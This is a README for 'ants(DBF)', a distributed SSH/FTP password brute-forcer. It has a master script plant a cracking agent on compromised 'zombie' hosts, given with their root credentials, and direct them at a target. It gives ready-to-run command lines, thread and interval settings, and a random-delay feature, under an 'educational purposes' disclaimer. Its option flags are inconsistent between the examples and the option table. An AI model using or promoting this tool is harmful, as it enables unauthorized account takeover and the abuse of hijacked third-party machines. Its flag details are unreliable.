# ants(DBF)         
Simple Distributed BruteForcer        
                  
## Requirement         
**OS system** : Debian/RHEL         
**Runtime Environment** :                          
\>  main-host: python27 with lib(paramiko)                                   
\>  zombie-host: python27 with lib(paramiko, ftplib)      
## Introduction        
\>  *owner.py*  : the master control program ,which is used to connect zombie_host (read from zombie_file) and create distribute tasks(use password dictionary). owner.py is a simple distributed bruteforcer framework.                       
\>  *zombie.py* : the child script program, attacker copy zombie.py to zombie_host after connection succeed. zombie.py is a bruteforcer agent, only support SSH cracking this version.               
\#slow mode                    
eg1: Each zombie works 10s interval, totally 30 threads        
python owner.py -H 192.168.0.10 -p 22 -u root -F passwd.lst -Z zombie.lst -S ssh -t 30 -d 10         
eg2: Each zombie works 1min interval, totally 300 threads        
python owner.py -T ssh://192.168.0.10:22 -u root -F passwd.lst -Z zombie.lst -t 300 -d 60      
\#fast mode             
eg1: Each zombie works 0.2s interval, totally 100 threads               
python owner.py -H 192.168.0.10 -p 22 -u root -F passwd.lst -Z zombie.lst -T ssh -t 100 -d 0.2                 
eg2: Each zombie works 0.01s interval, totally 100 threads                       
python owner.py -T ftp://192.168.0.10:21 -u ftp -F passwd.lst -Z zombie.lst -T ssh -t 100 -d 0.01      
```text                
-H <target host>  : Host IP of target.                 
-p <target_port>  : Port to connect to on the target.                      
-u <target_user>  ：Provide username when connect to the target.                   
-S <type>         : Only support SSH/FTP service now.              
-T <target>       : Provide target information. Format: ssh://10.1.1.1:22
-Z <zombie_file>  : Provide zombie's resource. Format: 192.168.0.1:root:toor.              
-F <passwd_file>  : Dictionary of passwords.                        
-l <threads>      ：Run threads number of connects in parallel, default 5.               
-c <interval>     : Defines the minimum wait time in seconds, default 5s. The ants(DBF) use random time interval technology. The actual time interval is 5.0~10.0 seconds.                
```                 

Ants(DBF) is only used for educational purposes and complies with the GPL agreement. Any acquisition and use of this tool will be regard as you have understood and agreed to the following rules:                 
1. Do not use this tool for attack or destructive purposes, in fact this is strongly opposed by the author.                          
2. Any risk of target property loss or legal issues caused by the use of this tool shall be borne by the user.                        
